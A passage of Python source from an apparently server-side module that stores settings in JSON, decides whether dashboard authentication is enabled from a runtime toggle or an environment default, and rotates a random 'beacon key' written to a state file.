            except IOError:
                pass
    return key


# --- settings / key rotation --------------------------------------------------

def read_settings():
    s = _jload(SETTINGS_FILE, {})
    return s if isinstance(s, dict) else {}


def write_settings(settings):
    _jsave(SETTINGS_FILE, settings)


def auth_enabled():
    """Effective dashboard auth-gate state.

    The runtime toggle (settings.json) wins once set; before that the env
    default (MALSTROM_AUTH) rules, so a fresh install behaves exactly as the
    deployed env configured it — no manual env editing to flip it later.
    """
    s = read_settings()
    if 'auth_enabled' in s:
        return bool(s['auth_enabled'])
    return config.AUTH_REQUIRED


def set_auth_enabled(on):
    s = read_settings()
    s['auth_enabled'] = bool(on)
    write_settings(s)
    return bool(on)


def rotate_beacon_key():
    key = os.urandom(6).hex()
    try:
        os.makedirs(config.STATE_DIR, exist_ok=True)
    except OSError:
        pass
    with _lock:
        try:
            with open(BEACON_KEY_FILE, 'w') as fh:
                fh.write(key + '\n')
        except IOError:
            pass
    return key